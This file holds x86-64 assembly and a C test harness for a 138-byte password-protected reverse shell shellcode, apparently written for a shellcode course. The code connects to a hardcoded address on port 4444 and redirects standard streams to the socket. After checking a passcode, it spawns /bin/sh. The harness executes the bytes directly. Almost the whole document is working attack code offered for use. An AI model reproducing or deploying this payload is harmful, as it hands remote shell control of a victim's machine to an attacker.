/*
; Author Andriy Brukhovetskyy - doomedraven - SLAEx64 1322
; 138 bytes
global _start
section .text
_start:

   ;socket syscall
   push byte 0x29 ; 41 socket
   pop rax
   push byte 0x2 ; AF_INET
   pop rdi
   push byte 0x1 ; SOCK_STREAM
   pop rsi
   cdq ;rdx = 0 - ANY
   syscall

   xchg rdi, rax ; save socket descriptor

   mov dword [rsp-4], 0x0901a8c0 ; ip
   mov word [rsp-6], 0x5c11      ; port 4444
   mov byte [rsp-8], 0x02
   sub rsp, 8

   push byte 0x2a ; connect
   pop rax
   mov rsi, rsp   ; pointer
   push byte 0x10 ; len
   pop rdx
   syscall

   push byte 0x3; counter
   pop rsi

dup2_loop:
   dec rsi
   push byte 0x21
   pop rax
   syscall
   jnz dup2_loop ; jump if not 0

   ;read buffer
   mov rdi, rax ; socket
   ;xor rax, rax
   cdq
   mov byte [rsp-1], al ;0 read
   sub rsp, 1

   push rdx
   lea rsi, [rsp-0x10] ; 16 bytes from buf
   add dl, 0x10        ; size_t count
   syscall

   ;test passcode
   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
   push rdi                    ; save the socket
   lea rdi, [rsi]              ; load string from address
   scasq                       ; compare
   jz accepted_passwd          ; jump if equal

   ;exit if different :P
   push byte 0x3c
   pop rax
   syscall

accepted_passwd:

   ;execve
   pop rdi; socket
   xor rax, rax
   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
   push rbx
   mov rdi, rsp
   push rax
   mov rdx, rsp
   push rdi
   mov rsi, rsp
   add al, 0x3b
   syscall
*/

#include <stdio.h>
#include <string.h>

// 138 bytes
unsigned char code[] =\
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
"\x48\x97\xc7\x44\x24\xfc"
"\xc0\xa8\x01\x09\x66\xc7\x44\x24\xfa"
"\x11\x5c" //port big endiant
"\xc6\x44\x24\xf8\x02\x48\x83"
"\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f"
"\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
"\x75\xf6\x48\x89\xc7\x99\x88\x44\x24\xff\x48\x83"
"\xec\x01\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f"
"\x05\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57"
"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05"
"\x5f\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
"\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48"
"\x89\xe6\x04\x3b\x0f\x05";

main()
{
   printf("Shellcode Length: %d\n", (int)strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}